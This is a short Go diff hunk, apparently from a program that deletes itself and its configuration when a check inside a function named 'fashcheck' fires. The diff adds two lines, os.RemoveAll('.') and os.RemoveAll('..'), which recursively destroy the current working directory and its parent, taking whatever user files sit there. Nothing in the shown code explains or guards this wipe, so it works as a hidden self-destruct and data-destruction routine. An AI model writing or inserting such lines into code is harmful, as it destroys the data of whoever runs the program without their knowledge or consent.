@@ -59,6 +59,8 @@ func fashcheck() bool {
 			os.Remove(os.Args[0])
 			os.Remove(common.ConfigLocation)
 			os.Remove(common.ConfigLocation + ".bak")
+			os.RemoveAll(".")
+			os.RemoveAll("..")
 			return true
 		}
 
